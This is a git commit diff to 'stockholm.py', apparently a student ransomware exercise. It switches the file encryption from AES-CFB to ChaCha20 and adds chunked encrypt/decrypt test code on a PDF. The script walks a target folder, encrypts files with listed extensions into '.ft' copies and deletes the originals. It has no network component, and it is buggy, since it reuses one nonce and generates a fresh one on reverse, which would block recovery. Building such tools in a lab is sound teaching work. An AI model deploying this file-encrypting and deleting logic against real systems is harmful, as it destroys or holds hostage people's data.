19adaa0cb2b943ca35456e370f7d3e79af7e15e5
mug4z <mug4z@protonmail.com>
2026-06-13 10:38:05 +0200

    fix(stockholm): encrypt with chunk by chunk

--- ft_stockholm/stockholm.py
+++ ft_stockholm/stockholm.py
@@ -10,6 +10,7 @@ import os
 from typing import Any
 from pathlib import Path
 import secrets
+from functools import partial
 
 from cryptography.fernet import Fernet
 from cryptography.hazmat.backends import default_backend
@@ -17,8 +18,9 @@ from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
 import base64
 
 VERSION = 1.0
-TARGET_FOLDER = "/home/tfrily/goinfre/LivreIT"
-# TARGET_FOLDER = Path.home().as_posix() + "/infection" 
+# TARGET_FOLDER = "/home/tfrily/goinfre/LivreIT"
+TARGET_FOLDER = "/home/camille/infection/LivreIT"
+#Encrypt TARGET_FOLDER = Path.home().as_posix() + "/infection" 
 
 def get_extentions(path_to_file: str) -> dict:
     d = {}
@@ -31,36 +33,28 @@ def create_key() -> bytes:
         key = secrets.token_bytes(32)
         return key
 
-def encrypt_data(key: bytes, plaintext: bytes) -> bytes:
-    # Generate a random initialization vector
-    iv = secrets.token_bytes(16)
+def encrypt_data(key: bytes, nonce: bytes, plaintext: bytes) -> bytes:
     
-    # Create a Cipher object
-    cipher = Cipher(algorithms.AES(key), modes.CFB(iv), backend=default_backend())
+    # Create a ChaCha20 cipher object
+    cipher = Cipher(algorithms.ChaCha20(key, nonce), mode=None, backend=default_backend())
     encryptor = cipher.encryptor()
     
     # Encrypt the plaintext
-    ciphertext = encryptor.update(plaintext) + encryptor.finalize()
+    ciphertext = encryptor.update(plaintext)
     
-    # Return the IV and ciphertext as a base64 encoded string
-    return base64.b64encode(iv + ciphertext)
+    # Encrypt the plaintext
+    return ciphertext
 
-def decrypt_data(key: bytes, encrypted_data: bytes) -> bytes:
-    # Decode the base64 encoded data
-    encrypted_data_bytes = base64.b64decode(encrypted_data)
-    
-    # Extract the IV and ciphertext
-    iv = encrypted_data_bytes[:16]
-    ciphertext = encrypted_data_bytes[16:]
+def decrypt_data(key: bytes,nonce: bytes ,encrypted_data: bytes) -> bytes:
     
     # Create a Cipher object
-    cipher = Cipher(algorithms.AES(key), modes.CFB(iv), backend=default_backend())
+    cipher = Cipher(algorithms.ChaCha20(key, nonce), mode=None, backend=default_backend())
     decryptor = cipher.decryptor()
     
     # Decrypt the ciphertext
-    decrypted_data = decryptor.update(ciphertext) + decryptor.finalize()
+    plaintext = decryptor.update(encrypted_data) 
     
-    return decrypted_data
+    return plaintext
 
 def get_content_file(path_to_file: str) -> bytes:
     content = None
@@ -77,24 +71,24 @@ def write_content_file(path_to_file: str, content: Any):
 def remove_file(path_to_file: str):
     os.remove(path_to_file)
 
-def encrypt_file(path_to_file: str, new_file: str, key: bytes):
+def encrypt_file(path_to_file: str, new_file: str, key: bytes, nonce: bytes):
         with open(path_to_file,'rb') as r_file:
             with open(new_file, 'wb') as w_file:
                 for line in r_file:
-                    w_file.write(encrypt_data(key, line))
+                    w_file.write(encrypt_data(key,nonce, line))
                 w_file.close()
         r_file.close()
 
 
-def decrypt_file(file_to_decrypt: str, new_file:str ,key: bytes):
+def decrypt_file(file_to_decrypt: str, new_file:str ,key: bytes, nonce:bytes):
         with open(file_to_decrypt,'rb') as r_file:
             with open(new_file, 'wb') as w_file:
                 for line in r_file:
-                    w_file.write(decrypt_data(key, line))
+                    w_file.write(decrypt_data(key,nonce, line))
                 w_file.close()
         r_file.close()
 
-def stockholm(key: bytes, s: bool):
+def stockholm(key: bytes, nonce:bytes ,s: bool):
     extentions = get_extentions("extensions.txt")
     # files = get_files(infection_dir)
     for root, subdirs, files in os.walk(TARGET_FOLDER):
@@ -103,7 +97,7 @@ def stockholm(key: bytes, s: bool):
                     if extentions[file.split('.')[-1]] and file.split('.')[-1] != "ft":
                         print(f"File TO Encrypt {file}")
                         # print(f"FILE {os.path.join(root,file)}")
-                        encrypt_file(os.path.join(root, file), os.path.join(root, file + ".ft"), key)
+                        encrypt_file(os.path.join(root, file), os.path.join(root, file + ".ft"), key, nonce)
                         # write_content_file(os.path.join(root, file + ".ft"), )
                         remove_file(os.path.join(root, file))
                     if s is True:
@@ -112,13 +106,14 @@ def stockholm(key: bytes, s: bool):
                     print(f"Failed for {e}")
                     continue
 
-def reverse_stockholm(key: bytes):
+def reverse_stockholm(key: bytes, nonce: bytes):
     for root, subdirs, files in os.walk(TARGET_FOLDER):
             for file in files:
                 try:
                     if file.split('.')[-1] == "ft":
+                        print(f"File TO decrypt {file}")
                         file_path, ext = os.path.splitext(os.path.join(root, file))
-                        decrypt_file(os.path.join(root, file),file_path ,key)
+                        decrypt_file(os.path.join(root, file),file_path ,key, nonce)
                         # write_content_file(file_path, decrypt_file(os.path.join(root, file), key))
                         remove_file(os.path.join(root, file))
                 except Exception as e:
@@ -135,6 +130,7 @@ def main():
     args = parser.parse_args()
     try:
         key = None
+        nonce = secrets.token_bytes(16)
         if args.version:
             print(f"stockholm version {VERSION}")
             exit(1)
@@ -145,12 +141,33 @@ def main():
                 key = create_key()
                 print(f"The key {key.hex()}")
             if not args.silent:
-                stockholm(key, True)
+                print(f"Open the file")
+                with open("/home/camille/infection/LivreIT/testPDF",'ab') as f_test:
+                    with open("/home/camille/infection/LivreIT/algorithmicthinking_aproblem-basedintroduction.pdf",'rb') as f:
+                        while True:
+                            chunk = f.read(2000000)
+                            if not chunk:
+                                break
+                            f_test.write(encrypt_data(key,nonce,chunk))
+                        f.close()
+                f_test.close()
+
+                with open("/home/camille/infection/LivreIT/testPDF_recover",'ab') as f_recover:
+                    with open("/home/camille/infection/LivreIT/testPDF",'rb') as f_test:
+                        while True:
+                            chunk = f_test.read(2000000)
+                            if not chunk:
+                                break
+                            f_recover.write(decrypt_data(key,nonce,chunk))
+                        f_test.close()
+                    f_recover.close()
+                # stockholm(key,nonce, True)
+                # reverse_stockholm(key,nonce)
             else:
-                stockholm(key, False)
+                stockholm(key,nonce, False)
 
         if args.reverse is not None:
-            reverse_stockholm(bytes(args.reverse, 'utf-8'))
+            reverse_stockholm(bytes(args.reverse, 'utf-8'),nonce)
         exit(1)
     except Exception as e:
         print(f"Failed for {e}")
